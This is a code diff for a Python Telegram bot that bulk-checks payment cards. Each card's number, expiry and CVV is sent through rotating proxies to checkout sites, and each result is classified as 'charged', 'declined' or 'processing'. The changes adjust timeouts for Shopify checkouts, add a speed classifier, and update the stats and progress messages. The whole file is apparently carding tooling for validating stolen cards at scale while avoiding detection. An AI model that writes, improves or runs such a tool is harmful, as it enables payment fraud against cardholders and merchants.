@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN FINAL OPTIMIZADA
-Con timeouts en resp.text(), BIN lookup no bloqueante y manejo real de proxies.
+Bot de Telegram para verificar tarjetas - VERSIÓN CON TIMEOUTS INTELIGENTES
+Basado en el código original con mejoras en el manejo de timeouts
 """
 
 import os
@@ -56,13 +56,14 @@ class Settings:
     MASS_COOLDOWN_MINUTES = int(os.environ.get("MASS_COOLDOWN", 3))
     ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]
 
-    # Configuración de timeouts
+    # ===== NUEVA CONFIGURACIÓN DE TIMEOUTS INTELIGENTES =====
     TIMEOUT_CONFIG = {
-        "connect": 3,
-        "sock_read": 5,
-        "total": 8,
-        "response_body": 3,
-        "bin_lookup": 2,  # Timeout para BIN lookup (más bajo)
+        "connect": 5,           # Proxy malo muere rápido (antes 3)
+        "sock_connect": 5,      # Mismo valor para connect
+        "sock_read": 45,        # Shopify puede tardar hasta 45s (antes 5)
+        "total": None,          # NUNCA matar procesos válidos (antes 8)
+        "response_body": 45,    # Timeout para leer body (antes 3)
+        "bin_lookup": 2,        # Timeout para BIN lookup (se mantiene)
     }
 
     CONFIDENCE_CONFIG = {
@@ -70,6 +71,11 @@ class Settings:
         "charged_normal_min": 2.0,
         "charged_normal_max": 7.0,
         "html_large_threshold": 50000,
+        # Nuevos thresholds para clasificación de velocidad
+        "speed_fast": 6,
+        "speed_normal": 15,
+        "speed_slow": 30,
+        "speed_heavy": 45,
     }
 
 # ================== LOGGING ==================
@@ -80,6 +86,48 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
+
+# ================== NUEVA FUNCIÓN: CLASIFICADOR DE VELOCIDAD ==================
+def get_speed_category(elapsed: float) -> str:
+    """Clasifica la velocidad de respuesta según thresholds"""
+    if elapsed < Settings.CONFIDENCE_CONFIG["speed_fast"]:
+        return "FAST"
+    elif elapsed < Settings.CONFIDENCE_CONFIG["speed_normal"]:
+        return "NORMAL"
+    elif elapsed < Settings.CONFIDENCE_CONFIG["speed_slow"]:
+        return "SLOW_PROCESSING"
+    elif elapsed < Settings.CONFIDENCE_CONFIG["speed_heavy"]:
+        return "HEAVY_PROCESSING"
+    else:
+        return "TIMEOUT_REAL"
+
+# ================== NUEVO ESTADO EN ENUM ==================
+class CheckStatus(Enum):
+    CHARGED = "charged"
+    DECLINED = "declined"
+    INSUFFICIENT_FUNDS = "insufficient_funds"
+    CARD_ERROR = "card_error"
+    RATE_LIMIT = "rate_limit"
+    BLOCKED = "blocked"
+    WAF_BLOCK = "waf_block"
+    SITE_DOWN = "site_down"
+    THREE_DS = "3ds"
+    CAPTCHA = "captcha"
+    CONNECT_TIMEOUT = "connect_timeout"      # Proxy murió rápido
+    READ_TIMEOUT = "read_timeout"
+    API_TIMEOUT = "api_timeout"
+    BODY_TIMEOUT = "body_timeout"
+    PROCESSING = "processing"                 # Gateway procesando (lento)
+    POSSIBLE_APPROVAL = "possible_approval"
+    AMBIGUOUS = "ambiguous"
+    UNKNOWN = "unknown"
+
+class Confidence(Enum):
+    HIGH = "HIGH"
+    MEDIUM = "MEDIUM"
+    LOW = "LOW"
+    SUSPICIOUS = "SUSPICIOUS"
+    CONFIRMED = "CONFIRMED"
 
 # ================== CACHÉ DE BIN (CON SESIÓN COMPARTIDA) ==================
 BIN_CACHE = {}
@@ -131,34 +179,7 @@ async def get_bin_info(bin_code: str) -> Dict:
         BIN_CACHE[bin_code] = (datetime.now(), default)
     return default
 
-# ================== ENUMS ==================
-class CheckStatus(Enum):
-    CHARGED = "charged"
-    DECLINED = "declined"
-    INSUFFICIENT_FUNDS = "insufficient_funds"
-    CARD_ERROR = "card_error"
-    RATE_LIMIT = "rate_limit"
-    BLOCKED = "blocked"
-    WAF_BLOCK = "waf_block"
-    SITE_DOWN = "site_down"
-    THREE_DS = "3ds"
-    CAPTCHA = "captcha"
-    CONNECT_TIMEOUT = "connect_timeout"
-    READ_TIMEOUT = "read_timeout"
-    API_TIMEOUT = "api_timeout"
-    BODY_TIMEOUT = "body_timeout"  # Nuevo: timeout en lectura de body
-    POSSIBLE_APPROVAL = "possible_approval"
-    AMBIGUOUS = "ambiguous"
-    UNKNOWN = "unknown"
-
-class Confidence(Enum):
-    HIGH = "HIGH"
-    MEDIUM = "MEDIUM"
-    LOW = "LOW"
-    SUSPICIOUS = "SUSPICIOUS"
-    CONFIRMED = "CONFIRMED"
-
-# ================== DATACLASSES ==================
+# ================== DATACLASSES ACTUALIZADAS ==================
 @dataclass
 class Job:
     """Una unidad de ejecución aislada"""
@@ -182,6 +203,7 @@ class JobResult:
     bin_info: Dict = field(default_factory=dict)
     price: str = "N/A"
     patterns_detected: List[str] = field(default_factory=list)
+    speed_category: str = "UNKNOWN"  # Nuevo campo
 
 @dataclass
 class CheckContext:
@@ -195,8 +217,9 @@ class CheckContext:
     response_size: int
     redirect_count: int
     timestamp: datetime
+    speed_category: str  # Nuevo campo
 
-# ================== CLASIFICADOR DE RESPUESTAS ==================
+# ================== CLASIFICADOR DE RESPUESTAS ACTUALIZADO ==================
 class ResponseThinker:
     SUCCESS_PATTERNS = {
         "thank_you": re.compile(r'thank\s*you', re.I),
@@ -228,17 +251,22 @@ class ResponseThinker:
     def think(cls, context: CheckContext) -> Tuple[CheckStatus, Confidence, str, List[str]]:
         patterns_detected = []
         
+        # Añadir categoría de velocidad a patrones
+        patterns_detected.append(context.speed_category.lower())
+        
         html_size = context.response_size
         
         if html_size > Settings.CONFIDENCE_CONFIG["html_large_threshold"]:
             patterns_detected.append("large_html")
         
-        if context.response_time < Settings.CONFIDENCE_CONFIG["charged_fast_threshold"]:
-            patterns_detected.append("fast_response")
-        elif Settings.CONFIDENCE_CONFIG["charged_normal_min"] <= context.response_time <= Settings.CONFIDENCE_CONFIG["charged_normal_max"]:
-            patterns_detected.append("normal_response")
-        else:
-            patterns_detected.append("slow_response")
+        # ===== NUEVA LÓGICA: Si es timeout de conexión, proxy murió rápido =====
+        if context.http_code is None and context.response_time < Settings.TIMEOUT_CONFIG["connect"]:
+            return CheckStatus.CONNECT_TIMEOUT, Confidence.CONFIRMED, "proxy_failed", patterns_detected + ["connect_timeout"]
+        
+        # ===== NUEVA LÓGICA: Si es muy lento pero vivo, es procesamiento =====
+        if context.speed_category in ["SLOW_PROCESSING", "HEAVY_PROCESSING"] and context.http_code == 200:
+            patterns_detected.append("gateway_delay")
+            # No lo marcamos como error, seguimos analizando contenido pero con menor prioridad
         
         if context.http_code:
             if context.http_code == 429:
@@ -281,9 +309,10 @@ class ResponseThinker:
                 patterns_detected.append(f"success:{success_type}")
         
         if success_matches:
+            # ===== NUEVA LÓGICA: No penalizar respuestas lentas con éxito =====
             if context.response_time < Settings.CONFIDENCE_CONFIG["charged_fast_threshold"]:
                 return CheckStatus.POSSIBLE_APPROVAL, Confidence.SUSPICIOUS, "fast response with success patterns", patterns_detected
-            elif Settings.CONFIDENCE_CONFIG["charged_normal_min"] <= context.response_time <= Settings.CONFIDENCE_CONFIG["charged_normal_max"]:
+            elif context.response_time <= Settings.CONFIDENCE_CONFIG["speed_heavy"]:  # Hasta 45s
                 if html_size < Settings.CONFIDENCE_CONFIG["html_large_threshold"]:
                     return CheckStatus.CHARGED, Confidence.HIGH, "confirmed checkout flow", patterns_detected
                 else:
@@ -291,12 +320,16 @@ class ResponseThinker:
             else:
                 return CheckStatus.POSSIBLE_APPROVAL, Confidence.LOW, "slow success response", patterns_detected
         
+        # ===== NUEVA LÓGICA: Si es lento pero sin patrones claros, probablemente procesando =====
+        if context.speed_category in ["SLOW_PROCESSING", "HEAVY_PROCESSING"] and html_size > 1000:
+            return CheckStatus.PROCESSING, Confidence.MEDIUM, "gateway processing", patterns_detected
+        
         if html_size > Settings.CONFIDENCE_CONFIG["html_large_threshold"]:
             return CheckStatus.AMBIGUOUS, Confidence.LOW, "large HTML response, possible WAF page", patterns_detected
         
         return CheckStatus.UNKNOWN, Confidence.LOW, "unrecognized response pattern", patterns_detected
 
-# ================== FUNCIONES AUXILIARES ==================
+# ================== FUNCIONES AUXILIARES ACTUALIZADAS ==================
 def create_progress_bar(current: int, total: int, width: int = 20) -> str:
     if total == 0:
         return "[" + "░" * width + "]"
@@ -308,6 +341,7 @@ def get_status_emoji(status: CheckStatus) -> str:
     emoji_map = {
         CheckStatus.CHARGED: "✅",
         CheckStatus.POSSIBLE_APPROVAL: "⚠️",
+        CheckStatus.PROCESSING: "⏳",  # Nuevo emoji
         CheckStatus.DECLINED: "❌",
         CheckStatus.INSUFFICIENT_FUNDS: "💸",
         CheckStatus.CARD_ERROR: "❌",
@@ -494,6 +528,7 @@ class Database:
             ''')
             cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
             
+            # ===== NUEVO CAMPO: speed_category =====
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS results (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -510,6 +545,7 @@ class Database:
                     price TEXT,
                     bin_info TEXT,
                     patterns TEXT,
+                    speed_category TEXT,  -- Nuevo campo
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
@@ -563,11 +599,12 @@ class Database:
     def _sync_execute_batch(self, batch: List[tuple]):
         with sqlite3.connect(self.db_path) as conn:
             cursor = conn.cursor()
+            # ===== NUEVO CAMPO EN INSERT =====
             cursor.executemany(
                 """INSERT INTO results 
                    (user_id, card_bin, card_last4, site, proxy, status, confidence,
-                    reason, response_time, http_code, price, bin_info, patterns)
-                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                    reason, response_time, http_code, price, bin_info, patterns, speed_category)
+                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                 batch
             )
             conn.commit()
@@ -588,7 +625,8 @@ class Database:
                 result.http_code, 
                 result.price, 
                 json.dumps(result.bin_info),
-                patterns_json
+                patterns_json,
+                result.speed_category  # Nuevo campo
             ))
 
     async def update_learning(self, user_id: int, result: JobResult):
@@ -689,8 +727,9 @@ class ProxyHealthChecker:
         self.db = db
         self.user_id = user_id
         self.test_url = "https://httpbin.org/ip"
+        # ===== ACTUALIZADO: Usar nuevos timeouts =====
         self.timeout = aiohttp.ClientTimeout(
-            total=Settings.TIMEOUT_CONFIG["total"],
+            total=None,  # Importante: total=None
             connect=Settings.TIMEOUT_CONFIG["connect"],
             sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
         )
@@ -716,14 +755,14 @@ class ProxyHealthChecker:
                 async with session.get(self.test_url, proxy=proxy_url) as resp:
                     if resp.status == 200:
                         elapsed = time.time() - start_time
-                        if elapsed < 4:
-                            result["alive"] = True
-                            result["response_time"] = elapsed
-                            try:
-                                data = await resp.json()
-                                result["ip"] = data.get("origin", "Unknown")
-                            except:
-                                pass
+                        # ===== NUEVO: No matar por tiempo, solo verificar respuesta =====
+                        result["alive"] = True
+                        result["response_time"] = elapsed
+                        try:
+                            data = await resp.json()
+                            result["ip"] = data.get("origin", "Unknown")
+                        except:
+                            pass
         except Exception as e:
             result["error"] = str(e)[:50]
         
@@ -754,13 +793,13 @@ class ProxyHealthChecker:
         
         return final_results
 
-# ================== EJECUTOR DE JOBS ==================
+# ================== EJECUTOR DE JOBS ACTUALIZADO ==================
 class JobExecutor:
     """Ejecuta un job usando una sesión HTTP existente (compartida por worker)"""
     
     @staticmethod
     async def execute(job: Job, session: aiohttp.ClientSession) -> JobResult:
-        """Ejecuta un job con la sesión del worker"""
+        """Ejecuta un job con la sesión del worker y timeouts inteligentes"""
         card_data = job.card_data
         card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
         params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
@@ -785,64 +824,92 @@ class JobExecutor:
             else:
                 proxy_url = None
             
-            # TIMEOUT TOTAL EN LA REQUEST
+            # ===== NUEVA CONFIGURACIÓN DE TIMEOUT =====
+            # NOTA: El timeout total ya está configurado en la sesión del worker como None
+            # Aquí solo manejamos la request sin timeout adicional
+            
             try:
-                async with asyncio.timeout(Settings.TIMEOUT_CONFIG["total"]):
-                    if proxy_url:
-                        async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
-                            elapsed = time.time() - start_time
-                            # TIMEOUT ESPECÍFICO PARA LEER EL BODY
-                            try:
-                                response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
-                            except asyncio.TimeoutError:
-                                response_text = ""
-                                return JobResult(
-                                    job=job,
-                                    status=CheckStatus.BODY_TIMEOUT,
-                                    confidence=Confidence.CONFIRMED,
-                                    reason="body read timeout",
-                                    response_time=time.time() - start_time,
-                                    http_code=resp.status,
-                                    response_text="",
-                                    success=False,
-                                    bin_info=bin_info,
-                                    price="N/A"
-                                )
-                    else:
-                        async with session.get(api_endpoint, params=params) as resp:
-                            elapsed = time.time() - start_time
-                            try:
-                                response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
-                            except asyncio.TimeoutError:
-                                response_text = ""
-                                return JobResult(
-                                    job=job,
-                                    status=CheckStatus.BODY_TIMEOUT,
-                                    confidence=Confidence.CONFIRMED,
-                                    reason="body read timeout",
-                                    response_time=time.time() - start_time,
-                                    http_code=resp.status,
-                                    response_text="",
-                                    success=False,
-                                    bin_info=bin_info,
-                                    price="N/A"
-                                )
+                if proxy_url:
+                    async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
+                        elapsed = time.time() - start_time
+                        # Timeout específico para leer el BODY (45s)
+                        try:
+                            response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
+                        except asyncio.TimeoutError:
+                            response_text = ""
+                            speed_category = get_speed_category(elapsed)
+                            return JobResult(
+                                job=job,
+                                status=CheckStatus.BODY_TIMEOUT,
+                                confidence=Confidence.CONFIRMED,
+                                reason="body read timeout",
+                                response_time=elapsed,
+                                http_code=resp.status,
+                                response_text="",
+                                success=False,
+                                bin_info=bin_info,
+                                price="N/A",
+                                speed_category=speed_category
+                            )
+                else:
+                    async with session.get(api_endpoint, params=params) as resp:
+                        elapsed = time.time() - start_time
+                        try:
+                            response_text = await asyncio.wait_for(resp.text(), timeout=Settings.TIMEOUT_CONFIG["response_body"])
+                        except asyncio.TimeoutError:
+                            response_text = ""
+                            speed_category = get_speed_category(elapsed)
+                            return JobResult(
+                                job=job,
+                                status=CheckStatus.BODY_TIMEOUT,
+                                confidence=Confidence.CONFIRMED,
+                                reason="body read timeout",
+                                response_time=elapsed,
+                                http_code=resp.status,
+                                response_text="",
+                                success=False,
+                                bin_info=bin_info,
+                                price="N/A",
+                                speed_category=speed_category
+                            )
+                            
             except asyncio.TimeoutError:
+                # ===== NUEVA LÓGICA: Timeout de conexión (proxy murió rápido) =====
                 elapsed = time.time() - start_time
-                return JobResult(
-                    job=job,
-                    status=CheckStatus.API_TIMEOUT,
-                    confidence=Confidence.CONFIRMED,
-                    reason="api request timeout",
-                    response_time=elapsed,
-                    http_code=None,
-                    response_text="",
-                    success=False,
-                    bin_info=bin_info,
-                    price="N/A"
-                )
+                speed_category = get_speed_category(elapsed)
+                
+                # Si es < connect timeout, es proxy malo
+                if elapsed < Settings.TIMEOUT_CONFIG["connect"]:
+                    return JobResult(
+                        job=job,
+                        status=CheckStatus.CONNECT_TIMEOUT,
+                        confidence=Confidence.CONFIRMED,
+                        reason="proxy_failed",
+                        response_time=elapsed,
+                        http_code=None,
+                        response_text="",
+                        success=False,
+                        bin_info=bin_info,
+                        price="N/A",
+                        speed_category=speed_category
+                    )
+                else:
+                    return JobResult(
+                        job=job,
+                        status=CheckStatus.API_TIMEOUT,
+                        confidence=Confidence.CONFIRMED,
+                        reason="api request timeout",
+                        response_time=elapsed,
+                        http_code=None,
+                        response_text="",
+                        success=False,
+                        bin_info=bin_info,
+                        price="N/A",
+                        speed_category=speed_category
+                    )
             
             response_size = len(response_text)
+            speed_category = get_speed_category(elapsed)
             
             context = CheckContext(
                 card_bin=card_data['bin'],
@@ -854,12 +921,17 @@ class JobExecutor:
                 response_text=response_text,
                 response_size=response_size,
                 redirect_count=len(resp.history) if resp.history else 0,
-                timestamp=datetime.now()
+                timestamp=datetime.now(),
+                speed_category=speed_category  # Nuevo campo
             )
             
             status, confidence, reason, patterns = ResponseThinker.think(context)
             price = extract_price(response_text)
             success = (status == CheckStatus.CHARGED)
+            
+            # ===== NUEVO: Si es PROCESSING, personalizar mensaje =====
+            if status == CheckStatus.PROCESSING:
+                reason = f"gateway processing ({elapsed:.1f}s)"
             
             return JobResult(
                 job=job,
@@ -872,12 +944,14 @@ class JobExecutor:
                 success=success,
                 bin_info=bin_info,
                 price=price,
-                patterns_detected=patterns
+                patterns_detected=patterns,
+                speed_category=speed_category  # Nuevo campo
             )
             
         except Exception as e:
             elapsed = time.time() - start_time
             logger.error(f"Error en job {job.job_id}: {e}")
+            speed_category = get_speed_category(elapsed)
             return JobResult(
                 job=job,
                 status=CheckStatus.UNKNOWN,
@@ -888,7 +962,8 @@ class JobExecutor:
                 response_text=str(e),
                 success=False,
                 bin_info=bin_info,
-                price="N/A"
+                price="N/A",
+                speed_category=speed_category
             )
 
 # ================== USER MANAGER ==================
@@ -1012,7 +1087,7 @@ class UserManager:
     async def is_admin(self, user_id: int) -> bool:
         return user_id in Settings.ADMIN_IDS
 
-# ================== CARD CHECK SERVICE ==================
+# ================== CARD CHECK SERVICE ACTUALIZADO ==================
 class CardCheckService:
     def __init__(self, db: Database, user_manager: UserManager):
         self.db = db
@@ -1020,8 +1095,9 @@ class CardCheckService:
 
     async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
         """Verifica una sola tarjeta (crea sesión temporal)"""
+        # ===== NUEVA CONFIGURACIÓN DE TIMEOUT =====
         timeout = aiohttp.ClientTimeout(
-            total=Settings.TIMEOUT_CONFIG["total"],
+            total=None,  # CRÍTICO: No matar procesos válidos
             connect=Settings.TIMEOUT_CONFIG["connect"],
             sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
         )
@@ -1048,7 +1124,7 @@ class CardCheckService:
         sites: List[str],
         proxies: List[str],
         progress_callback=None
-    ) -> Tuple[List[JobResult], int, int, int, float]:
+    ) -> Tuple[List[JobResult], int, int, int, int, float]:  # Añadido processing
         
         total_cards = len(cards)
         
@@ -1076,6 +1152,7 @@ class CardCheckService:
         approved = 0
         declined = 0
         timeout = 0
+        processing = 0  # Nuevo contador
         start_time = time.time()
         
         counter_lock = asyncio.Lock()
@@ -1083,9 +1160,16 @@ class CardCheckService:
         
         num_workers = min(len(proxies), Settings.MAX_WORKERS_PER_USER, total_cards)
         
-        # Updater independiente
+        # ===== NUEVA CONFIGURACIÓN DE TIMEOUT PARA WORKERS =====
+        timeout_cfg = aiohttp.ClientTimeout(
+            total=None,
+            connect=Settings.TIMEOUT_CONFIG["connect"],
+            sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
+        )
+        
+        # Updater independiente (actualizado con nuevo contador)
         async def progress_updater():
-            nonlocal processed, approved, declined, timeout
+            nonlocal processed, approved, declined, timeout, processing
             while running or processed < total_cards:
                 await asyncio.sleep(0.5)
                 
@@ -1095,13 +1179,15 @@ class CardCheckService:
                         current_approved = approved
                         current_declined = declined
                         current_timeout = timeout
+                        current_processing = processing
                     
                     try:
                         await progress_callback(
                             current_processed, 
                             current_approved, 
                             current_declined, 
-                            current_timeout, 
+                            current_timeout,
+                            current_processing,  # Nuevo
                             total_cards
                         )
                     except Exception as e:
@@ -1109,15 +1195,9 @@ class CardCheckService:
         
         # Worker con SESIÓN COMPARTIDA
         async def worker(worker_id: int):
-            nonlocal processed, approved, declined, timeout
+            nonlocal processed, approved, declined, timeout, processing
             
             # Cada worker crea UNA sola sesión y la reutiliza
-            timeout_cfg = aiohttp.ClientTimeout(
-                total=Settings.TIMEOUT_CONFIG["total"],
-                connect=Settings.TIMEOUT_CONFIG["connect"],
-                sock_read=Settings.TIMEOUT_CONFIG["sock_read"]
-            )
-            
             async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
                 while True:
                     if cancel_mass.get(user_id, False):
@@ -1136,6 +1216,8 @@ class CardCheckService:
                     async with counter_lock:
                         if result.success:
                             approved += 1
+                        elif result.status == CheckStatus.PROCESSING:
+                            processing += 1
                         elif "timeout" in result.status.value:
                             timeout += 1
                         else:
@@ -1171,9 +1253,9 @@ class CardCheckService:
         
         if progress_callback:
             async with counter_lock:
-                await progress_callback(processed, approved, declined, timeout, total_cards)
+                await progress_callback(processed, approved, declined, timeout, processing, total_cards)
         
-        return results, approved, declined, timeout, elapsed
+        return results, approved, declined, timeout, processing, elapsed
 
 # ================== VARIABLES GLOBALES ==================
 db = None
@@ -1246,7 +1328,7 @@ async def check_howto(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
 
-# ================== SUBMENÚ MASS CHECK ==================
+# ================== SUBMENÚ MASS CHECK ACTUALIZADO ==================
 async def show_mass_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
@@ -1644,7 +1726,7 @@ async def cards_remove_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
 
-# ================== SUBMENÚ STATS ==================
+# ================== SUBMENÚ STATS ACTUALIZADO ==================
 async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -1659,6 +1741,12 @@ async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         (user_id,)
     )
     charged_count = charged["count"] if charged else 0
+    
+    processing = await db.fetch_one(
+        "SELECT COUNT(*) as count FROM results WHERE user_id = ? AND status = 'processing'",
+        (user_id,)
+    )
+    processing_count = processing["count"] if processing else 0
     
     declined = await db.fetch_one(
         "SELECT COUNT(*) as count FROM results WHERE user_id = ? AND status IN ('declined', 'insufficient_funds', 'card_error')",
@@ -1677,6 +1765,7 @@ async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━\n\n"
         f"Total checks: {total_count}\n"
         f"✅ Approved: {charged_count}\n"
+        f"⏳ Processing: {processing_count}\n"
         f"❌ Declined: {declined_count}\n"
         f"⏱️ Timeout: {timeout_count}"
     )
@@ -1691,7 +1780,7 @@ async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)
 
-# ================== SUBMENÚ SETTINGS ==================
+# ================== SUBMENÚ SETTINGS ACTUALIZADO ==================
 async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "⚙️ *SETTINGS*\n"
@@ -1731,14 +1820,18 @@ async def settings_workers(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def settings_timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        "⏱ *TIMEOUT CONFIGURATION*\n"
+        "⏱ *TIMEOUT CONFIGURATION (INTELIGENTE)*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        f"Connect timeout: `{Settings.TIMEOUT_CONFIG['connect']}s`\n"
-        f"Read timeout: `{Settings.TIMEOUT_CONFIG['sock_read']}s`\n"
-        f"Total timeout: `{Settings.TIMEOUT_CONFIG['total']}s`\n"
+        f"Connect timeout: `{Settings.TIMEOUT_CONFIG['connect']}s` (proxy malo muere rápido)\n"
+        f"Read timeout: `{Settings.TIMEOUT_CONFIG['sock_read']}s` (Shopify puede tardar)\n"
+        f"Total timeout: `None` (NO matar procesos válidos)\n"
         f"Body read timeout: `{Settings.TIMEOUT_CONFIG['response_body']}s`\n"
         f"BIN lookup timeout: `{Settings.TIMEOUT_CONFIG['bin_lookup']}s`\n\n"
-        "These values are optimized for balance between speed and reliability."
+        "*Clasificación de velocidad:*\n"
+        f"• FAST: < {Settings.CONFIDENCE_CONFIG['speed_fast']}s\n"
+        f"• NORMAL: < {Settings.CONFIDENCE_CONFIG['speed_normal']}s\n"
+        f"• SLOW: < {Settings.CONFIDENCE_CONFIG['speed_slow']}s (procesando)\n"
+        f"• HEAVY: < {Settings.CONFIDENCE_CONFIG['speed_heavy']}s (procesando lento)"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
@@ -1764,7 +1857,7 @@ async def settings_rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
 
-# ================== INICIAR MASS CHECK ==================
+# ================== INICIAR MASS CHECK ACTUALIZADO ==================
 async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user_id = update.effective_user.id
@@ -1804,6 +1897,7 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━\n\n"
         f"Progress: {bar} 0/{len(valid_cards)}\n\n"
         f"✅ Approved: 0\n"
+        f"⏳ Processing: 0\n"
         f"❌ Declined: 0\n"
         f"⏱ Timeout: 0\n\n"
         f"⚡ Speed: 0.0 cards/s\n"
@@ -1816,7 +1910,7 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
     
-    async def progress_callback(proc: int, apr: int, dec: int, to: int, total: int):
+    async def progress_callback(proc: int, apr: int, dec: int, to: int, proc_count: int, total: int):
         if cancel_mass.get(user_id, False):
             return
         
@@ -1824,19 +1918,12 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         speed = proc / elapsed if elapsed > 0 else 0
         bar = create_progress_bar(proc, total)
         
-        timeout_rate = to / proc if proc > 0 else 0
-        if timeout_rate > 0.3:
-            icon = "🔴"
-        elif timeout_rate > 0.15:
-            icon = "🟡"
-        else:
-            icon = "🟢"
-        
         text = (
-            f"{icon} *MASS CHECK IN PROGRESS*\n"
+            f"📦 *MASS CHECK IN PROGRESS*\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"Progress: {bar} {proc}/{total}\n\n"
             f"✅ Approved: {apr}\n"
+            f"⏳ Processing: {proc_count}\n"
             f"❌ Declined: {dec}\n"
             f"⏱ Timeout: {to}\n\n"
             f"⚡ Speed: {speed:.1f} cards/s\n"
@@ -1849,7 +1936,7 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
     
     start_time = time.time()
-    results, approved, declined, timeout, elapsed = await card_service.check_mass(
+    results, approved, declined, timeout, processing, elapsed = await card_service.check_mass(
         user_id=user_id,
         cards=valid_cards,
         sites=sites,
@@ -1867,6 +1954,7 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"Processed: {len(results)}/{len(valid_cards)}\n"
             f"✅ Approved: {approved}\n"
+            f"⏳ Processing: {processing}\n"
             f"❌ Declined: {declined}\n"
             f"⏱ Timeout: {timeout}\n\n"
             f"⏳ Elapsed: {format_time(elapsed)}"
@@ -1882,6 +1970,7 @@ async def mass_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━\n\n"
         f"Processed: {len(valid_cards)} cards\n"
         f"✅ Approved: {approved}\n"
+        f"⏳ Processing: {processing}\n"
         f"❌ Declined: {declined}\n"
         f"⏱ Timeout: {timeout}\n\n"
         f"⏱ Time: {format_time(elapsed)}\n"
@@ -1922,7 +2011,7 @@ async def mass_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
     filename = f"mass_{user_id}_{int(time.time())}.txt"
     with open(filename, "w", encoding="utf-8") as f:
         f.write(f"RESULTS - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        f.write(f"Total: {len(cards)} | Approved: {sum(1 for r in results if r.success)}\n")
+        f.write(f"Total: {len(cards)} | Approved: {sum(1 for r in results if r.success)} | Processing: {sum(1 for r in results if r.status == CheckStatus.PROCESSING)}\n")
         f.write("="*80 + "\n\n")
         
         for i, r in enumerate(results, 1):
@@ -1930,9 +2019,9 @@ async def mass_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f.write(f"[{i}] {emoji} Card: {r.job.card_data['bin']}xxxxxx{r.job.card_data['last4']}\n")
             f.write(f"    Status: {r.status.value.upper()} ({r.confidence.value})\n")
             f.write(f"    Reason: {r.reason}\n")
+            f.write(f"    Speed: {r.speed_category} ({r.response_time:.2f}s)\n")
             f.write(f"    Site: {r.job.site}\n")
             f.write(f"    Proxy: {r.job.proxy}\n")
-            f.write(f"    Time: {r.response_time:.2f}s\n")
             f.write("-"*40 + "\n")
     
     with open(filename, "rb") as f:
@@ -2100,7 +2189,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]])
         )
 
-# ================== MANEJO DE MENSAJES ==================
+# ================== MANEJO DE MENSAJES ACTUALIZADO ==================
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
@@ -2179,17 +2268,24 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             emoji = get_status_emoji(result.status)
             confidence_text = f"({result.confidence.value})"
             
+            # ===== NUEVO: Mostrar categoría de velocidad =====
+            speed_icon = "⚡" if result.speed_category == "FAST" else "⏳"
+            
             response = (
                 f"{emoji} *RESULT*\n"
